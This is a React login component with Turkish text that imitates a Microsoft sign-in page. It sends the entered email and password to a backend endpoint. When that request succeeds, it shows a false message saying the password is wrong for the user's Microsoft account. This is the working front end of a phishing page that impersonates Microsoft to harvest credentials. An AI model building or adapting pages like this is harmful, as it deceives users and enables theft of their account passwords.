import React, { useState } from "react";
import "./Login.css";
import axios from "axios";

const Login = () => {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [message, setMessage] = useState("");
    const [isEmailValid, setIsEmailValid] = useState(true);

    // ✅ Regex ile daha doğru e-mail kontrolü
    const validateEmail = (value) => {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(value);
    };

    const handleEmailChange = (e) => {
        const value = e.target.value;
        setEmail(value);
        setIsEmailValid(validateEmail(value));
    };

    const handleLogin = async (e) => {
        e.preventDefault();

        if (!isEmailValid) {
            setMessage("Geçerli bir e-posta adresi giriniz!");
            return;
        }

        try {
            const response = await axios.post("http://localhost:5213/api/Auth/login", {
                email: email,
                password: password,
            });

            if (response.data.success) {
                setMessage("Bu parola, Microsoft hesabınız için hatalı.");
            } else {
                setMessage("Hata: " + response.data.message);
            }
        } catch (error) {
            console.error("Sunucu hatası:", error.response ? error.response.data : error.message);
            setMessage("Sunucu hatası! Console'a bak.");
        }
    };

    return (
        <div className="windows-login-container">
            <div className="login-box">
                <h2>Oturum Açın</h2>
                <form onSubmit={handleLogin}>
                    <input
                        type="email"
                        placeholder="E-posta, telefon veya skype"
                        value={email}
                        onChange={handleEmailChange}
                        required
                    />
                    {!isEmailValid && <p className="error">Geçerli bir e-posta adresi giriniz!</p>}

                    <input
                        type="password"
                        placeholder="Parola"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />

                    <button type="submit" disabled={!isEmailValid || !password}>
                        Giriş Yap
                    </button>
                </form>
                {message && <p className="message">{message}</p>}
            </div>
        </div>
    );
};

export default Login;
